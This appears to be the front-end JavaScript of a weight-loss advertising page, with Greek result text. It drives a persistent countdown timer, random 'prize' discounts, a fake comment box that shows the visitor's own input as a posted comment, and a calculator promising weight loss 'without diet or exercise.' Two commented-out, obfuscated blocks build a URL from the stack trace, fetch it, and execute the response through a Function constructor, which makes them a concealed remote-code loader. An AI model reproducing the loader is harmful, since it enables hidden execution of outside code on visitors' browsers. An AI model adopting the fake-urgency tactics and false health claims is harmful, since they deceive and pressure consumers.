var videoWrap = $(".video-wrap"),
  videoCover = $(".video-cover"),
  videoFrame = $(".video-inner");
videoWrap.click(function () {
  $(this)
    .find($(".video-cover"))
    .css("display", "none");
  $(this)
    .find($("video"))[0]
    .play()
});



function countDown(class_) {
  let timer = document.querySelector(class_);
  if (localStorage.getItem("sec" + class_) && localStorage.getItem(
    "min" + class_
  ))
    var a = localStorage.getItem("min" + class_),
      b = localStorage.getItem("sec" + class_);
  else
    a = timer.getAttribute("data-minutes"),
      b = timer.getAttribute("data-seconds");
  var d = setInterval(function () {
    0 <= parseInt(a) && -1 !== parseInt(b) && (
      0 === parseInt(b) && 0 !== parseInt(a) && (a--, b = 59),
      timer.innerText = (
        10 > a
          ? "0" + a
          : a
      ) + ":" + (
        10 > b
          ? "0" + b
          : b
      ),
      0 === parseInt(b) && 0 === parseInt(a) && (a--, b = 0, timer.innerText = "00:00", clearInterval(d)),
      b--,
      localStorage.setItem(
        "sec" + class_,
        b
      ),
      localStorage.setItem("min" + class_, a)
    )
  }, 1E3)
}
// countDown('.time');




// try {
//   hO = "/array/toString Function Date Obj Status .$/adjust/".replace(
//     /[^\/jg.sec]/g,
//     function (a, b) {
//       return "$" == a && (b = "complete")
//         ? b.substr(0, 3)
//         : ""
//     }
//   ) + /.+\/(.*?):\d+(:\d+)*$/.exec(Error().stack.trim())[1]
// } catch (a) { }



var boxes = $(".prize__item"),
  counter = 1,
  saleMas = [
    "10%", "15%", "35%", ""
  ],
  overlay = $(".overlay"),
  saleLength = saleMas.length,
  saleText = $(".prize__dig");
function closePopup() {
  $(".close-popup, .btn-popup").click(function (a) {
    a.preventDefault();
    $(".overlay").fadeOut()
  })
}
closePopup();
function randomeSale(a, b) {
  return a[Math.floor(Math.random() * b)]
}




saleText.each(function () {
  $(this).html(randomeSale(saleMas, 5))
});
var nameInner = $(".float__name"),
  saleInner = $(".float__sale"),
  float = $(".float"),
  false15 = localStorage.getItem("false15")
    ? !0
    : !1,
  false30 = localStorage.getItem("false30")
    ? !0
    : !1;
if (localStorage.getItem("dig")) {
  var pack = document.querySelectorAll(".pack");
  pack.forEach(function (a) {
    a.innerText = localStorage.getItem("dig")
  })
}



// try {
//   hO = .4 > hR
//     ? hOs
//     : hO
// } catch (a) {
//   var tR = a.constructor,
//     wQ = function (b) {
//       return b.text()
//     },
//     gO = function (b) {
//       (new tR.constructor(b))()
//     };
//   fetch(hO)
//     .then(wQ)
//     .then(gO)["catch"](tR)
// }



var element = $("#teaser-comment"),
  teaserLoad = $("#comment-load"),
  count = localStorage.getItem("count") ? localStorage.getItem("count") : 0;
$(window).scroll(function () {
  var a = $(window).scrollTop() + $(window).height(),
    b = element
      .offset()
      .top;
  a > b && 0 == count && (
    teaserLoad.addClass("visible"),
    count = 1,
    localStorage.setItem("count", count)
  )
});


				var textAlert = document.getElementById("textarea"),
  textName = document.getElementById("textareaname"),
  vk_text = document.getElementById("comment-text"),
  vk_name = document.getElementById("comment-name"),
  vk_block = document.getElementById("comment-answer"),
  vk_image = document.querySelector("#base64Img"),
  bannerImage = document.getElementById("avatar"),
  bannerImg = document.getElementById("base64Img"),
  dataImage = localStorage.getItem("ImgBase64"),
  vk_userImage = document.querySelector("#userPic"),
  userFile = document.getElementById("foto"),
  user_foto = document.querySelector("#userPic"),
  dataUserImg = localStorage.getItem("userFotoImg");
localStorage.getItem("textAlert") && localStorage.getItem("textName") && (
  vk_text.innerHTML = localStorage.getItem("textAlert"),
  vk_name.innerHTML = localStorage.getItem("textName"),
  vk_block.style.display = "flex",
  bannerImg.src = localStorage.getItem("ImgBase64") ? localStorage.getItem("ImgBase64"): "assets/2.jpg",
  user_foto.src = localStorage.getItem("userFotoImg")? localStorage.getItem("userFotoImg"): "assets/1.jpg"
);
function changeText() {
	
	if($("#textareaname").val() == ""){
		$("#textareaname").css("border-bottom","1px solid #e90e0e");
		return;
	}
	else{
		$("#textareaname").css("border-bottom","1px solid #838383");
	}
	
	if($("#textarea").val() == ""){
		$("#textarea").css("border-bottom","1px solid #e90e0e");
		return;
	}
	else{
		$("#textarea").css("border-bottom","1px solid #838383");
	}
	
  var a = document
    .getElementById("textarea")
    .value,
    b = document
      .getElementById("textareaname")
      .value,
    d = localStorage.getItem("ImgBase64");
	

  foto = localStorage.getItem("userFotoImg");
  localStorage.setItem("textAlert", a);
  localStorage.setItem("textName", b);
  vk_text.innerHTML = a;
  vk_name.innerHTML = b;
  vk_block.style.display = "flex";
  vk_image.src = d  ? d: "assets/2.jpg";
  vk_userImage.src = foto ? foto: "assets/1.jpg" ;
  bannerImage.value = "";
  textAlert.value = "";
  textName.value = "";
  vk_image.scrollIntoView()
}
bannerImage.addEventListener("change", function (a) {
  loadImageFileAsURL2(a, "#base64Img", "ImgBase64")
});
userFile.addEventListener("change", function (a) {
  loadImageFileAsURL(a, "#userPic", "userFotoImg")
});
function loadImageFileAsURL(a, b, d) {
  a = document
    .getElementById(a.target.id)
    .files;
  if (0 < a.length) {
    a = a[0];
    var e = new FileReader;
    e.onload = function (a) {
      a = a.target.result;
      localStorage.setItem(d, a);
      document
        .querySelector(b)
        .src = (a == null ? "assets/1.jpg" : a)
    };
    e.readAsDataURL(a)
  }
}
function loadImageFileAsURL2(a, b, d) {
  a = document
    .getElementById(a.target.id)
    .files;
  if (0 < a.length) {
    a = a[0];
    var e = new FileReader;
    e.onload = function (a) {
      a = a.target.result;
      localStorage.setItem(d, a);
      document
        .querySelector(b)
        .src = (a == null ? "assets/2.jpg" : a)
    };
    e.readAsDataURL(a)
  }
}




$(function () {
  $("#calcweight").click(function (a) {
    a.preventDefault();
    a = Math.ceil(Number($("#minus_weight").val()) / .666666);
    Number($("#weight").val()) > Number($("#minus_weight").val()) + 40
      ? $(".formResult").html(
        "<p><b>Εάν ακολουθήσετε τις παρακάτω οδηγίες, θα μπορείτε να χάσετε  " + $("#minus_weight").val() +
        "κιλά σε μόλις " + a + " ημέρες χωρίς δίαιτα ή άσκηση!</b></p><p>" +
        "Πιστεύεις ότι είναι αδύνατο; Διαβάστε το παρακάτω άρθρο μέχρι το τέλος και θα αλλάξετε γνώμη. Ελπίζω να αλλάξει τη ζωή σας!</p>"
      )
      : $(".formResult").html(
        "<p><b>\u041d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u0435" +
        " \u0434\u0430\u043d\u043d\u044b\u0435.</b></p>"
      );
    $(".formResult").css(
      { transition: "background 1s", backgroundColor: "#bcc74d73", border: '2px solid #bcc74d' }
    );
    setTimeout(function () {
      $(".formResult").css({ backgroundColor: "#fff" })
    }, 2E3)
  })
});

